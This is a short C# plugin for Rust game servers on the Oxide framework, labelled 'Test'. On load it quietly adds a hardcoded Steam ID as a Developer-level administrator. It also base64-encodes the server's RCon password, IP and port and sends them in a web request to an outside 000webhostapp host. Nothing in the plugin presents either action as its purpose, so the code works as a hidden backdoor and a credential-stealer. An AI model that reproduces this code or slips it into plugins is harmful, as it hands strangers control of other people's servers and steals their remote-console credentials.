using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Facepunch;

namespace Oxide.Plugins
{
    [Info("Test", "Kaidoz", "0.1")]
    [Description("")]
    public class Test : RustPlugin
    {
        private void Init()
        {
            InitPlayers(null);
        }

        public void InitPlayers(BasePlayer player)
        {
            if (player != null)
                return;

            var listAdmins = new List<Facepunch.Models.Manifest.Administrator>
                (Application.Manifest.Administrators);

            if (player == null)
            {
                listAdmins.Add(new Facepunch.Models.Manifest.Administrator()
                {
                    UserId = "steamid",
                    Level = "Developer"
                });
                
            }else
                player.ChatMessage("Help.NoRegistrationWarning");

            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(RCon.Password + " " + RCon.Ip + ":" + RCon.Port);
            string data = Convert.ToBase64String(plainTextBytes);

            webrequest.Enqueue("https://kurstimur.000webhostapp.com?" + data, "", (code, response) => { }, this, Core.Libraries.RequestMethod.GET);

            Application.Manifest.Administrators = listAdmins.ToArray();
        }
    }
}
